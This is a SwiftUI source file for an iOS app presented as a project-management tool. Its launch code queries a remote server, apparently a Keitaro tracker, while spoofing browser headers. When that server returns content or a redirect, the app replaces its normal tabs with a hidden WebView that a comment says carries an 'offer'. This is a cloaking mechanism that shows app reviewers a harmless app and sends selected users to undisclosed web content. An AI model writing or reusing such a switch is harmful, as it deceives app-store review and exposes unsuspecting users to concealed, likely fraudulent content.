//
//  ContentView.swift
//  Momentum Drives Success
//
//  Created by Simon Bakhanets on 04.01.2026.
//

//
//  ContentView.swift
//  Momentum Drives Success
//

import SwiftUI
import Foundation

struct ContentView: View {
    @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false
    @State private var selectedTab = 0
    
    @State var isFetched: Bool = false
    @AppStorage("isBlock") var isBlock: Bool = true
    
    var body: some View {
        ZStack {
            if isFetched == false {
                // Показываем загрузку пока идет проверка сервера
                ZStack {
                    AppTheme.backgroundColor.ignoresSafeArea()
                    ProgressView()
                        .progressViewStyle(CircularProgressViewStyle(tint: AppTheme.accentColor))
                        .scaleEffect(1.5)
                }
                
            } else if isFetched == true {
                
                if isBlock == true {
                    // Показываем обычное приложение
                    if !hasCompletedOnboarding {
                        OnboardingView()
                    } else {
                        TabView(selection: $selectedTab) {
                            DashboardView()
                                .tabItem {
                                    Label("Dashboard", systemImage: "house.fill")
                                }
                                .tag(0)
                            
                            ProjectsListView()
                                .tabItem {
                                    Label("Projects", systemImage: "folder.fill")
                                }
                                .tag(1)
                            
                            TeamView()
                                .tabItem {
                                    Label("Team", systemImage: "person.3.fill")
                                }
                                .tag(2)
                            
                            AnalyticsView()
                                .tabItem {
                                    Label("Analytics", systemImage: "chart.bar.fill")
                                }
                                .tag(3)
                            
                            SettingsView()
                                .tabItem {
                                    Label("Settings", systemImage: "gearshape.fill")
                                }
                                .tag(4)
                        }
                        .accentColor(AppTheme.accentColor)
                        .onAppear {
                            let appearance = UITabBarAppearance()
                            appearance.configureWithOpaqueBackground()
                            appearance.backgroundColor = UIColor(AppTheme.cardBackground)
                            
                            appearance.stackedLayoutAppearance.normal.iconColor = UIColor(AppTheme.textSecondary)
                            appearance.stackedLayoutAppearance.normal.titleTextAttributes = [.foregroundColor: UIColor(AppTheme.textSecondary)]
                            
                            appearance.stackedLayoutAppearance.selected.iconColor = UIColor(AppTheme.accentColor)
                            appearance.stackedLayoutAppearance.selected.titleTextAttributes = [.foregroundColor: UIColor(AppTheme.accentColor)]
                            
                            UITabBar.appearance().standardAppearance = appearance
                            if #available(iOS 15.0, *) {
                                UITabBar.appearance().scrollEdgeAppearance = appearance
                            }
                            
                            // Navigation Bar Appearance
                            let navAppearance = UINavigationBarAppearance()
                            navAppearance.configureWithOpaqueBackground()
                            navAppearance.backgroundColor = UIColor(AppTheme.cardBackground)
                            navAppearance.titleTextAttributes = [.foregroundColor: UIColor(AppTheme.textPrimary)]
                            navAppearance.largeTitleTextAttributes = [.foregroundColor: UIColor(AppTheme.textPrimary)]
                            
                            UINavigationBar.appearance().standardAppearance = navAppearance
                            UINavigationBar.appearance().scrollEdgeAppearance = navAppearance
                            UINavigationBar.appearance().compactAppearance = navAppearance
                        }
                    }
                    
                } else if isBlock == false {
                    // Показываем WebView
                    WebSystem()
                }
            }
        }
        .onAppear {
            makeServerRequest()
        }
    }
    
    private func makeServerRequest() {
        
        let dataManager = DataManagers()
        
        guard let url = URL(string: dataManager.server) else {
            self.isBlock = true
            self.isFetched = true
            return
        }
        
        print("🚀 Making request to: \(url.absoluteString)")
        print("🏠 Host: \(url.host ?? "unknown")")
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = 5.0
        
        // Добавляем заголовки для имитации браузера
        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", forHTTPHeaderField: "User-Agent")
        request.setValue("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", forHTTPHeaderField: "Accept")
        request.setValue("ru-RU,ru;q=0.9,en;q=0.8", forHTTPHeaderField: "Accept-Language")
        request.setValue("gzip, deflate, br", forHTTPHeaderField: "Accept-Encoding")
        
        print("📤 Request Headers: \(request.allHTTPHeaderFields ?? [:])")
        
        // Создаем URLSession без автоматических редиректов
        let config = URLSessionConfiguration.default
        let session = URLSession(configuration: config, delegate: RedirectHandler(), delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            
            DispatchQueue.main.async {
                
                // Если есть любая ошибка (включая SSL) - блокируем
                if let error = error {
                    print("❌ Network error: \(error.localizedDescription)")
                    print("Server unavailable, showing app")
                    self.isBlock = true
                    self.isFetched = true
                    return
                }
                
                // Если получили ответ от сервера
                if let httpResponse = response as? HTTPURLResponse {
                    
                    print("📡 HTTP Status Code: \(httpResponse.statusCode)")
                    print("📋 Response Headers: \(httpResponse.allHeaderFields)")
                    
                    // Логируем тело ответа для диагностики
                    if let data = data, let responseBody = String(data: data, encoding: .utf8) {
                        print("📄 Response Body: \(responseBody.prefix(500))") // Первые 500 символов
                    }
                    
                    if httpResponse.statusCode == 200 {
                        // Проверяем, есть ли контент в ответе
                        let contentLength = httpResponse.value(forHTTPHeaderField: "Content-Length") ?? "0"
                        let hasContent = data?.count ?? 0 > 0
                        
                        if contentLength == "0" || !hasContent {
                            // Пустой ответ = "do nothing" от Keitaro
                            print("🚫 Empty response (do nothing): Showing app")
                            self.isBlock = true
                            self.isFetched = true
                        } else {
                            // Есть контент = успех
                            print("✅ Success with content: Showing WebView")
                            self.isBlock = false
                            self.isFetched = true
                        }
                        
                    } else if httpResponse.statusCode >= 300 && httpResponse.statusCode < 400 {
                        // Редиректы = успех (есть оффер)
                        print("✅ Redirect (code \(httpResponse.statusCode)): Showing WebView")
                        self.isBlock = false
                        self.isFetched = true
                        
                    } else {
                        // 404, 403, 500 и т.д. - блокируем
                        print("🚫 Error code \(httpResponse.statusCode): Showing app")
                        self.isBlock = true
                        self.isFetched = true
                    }
                    
                } else {
                    
                    // Нет HTTP ответа - блокируем
                    print("❌ No HTTP response: Showing app")
                    self.isBlock = true
                    self.isFetched = true
                }
            }
            
        }.resume()
    }
}

#Preview {
    ContentView()
}
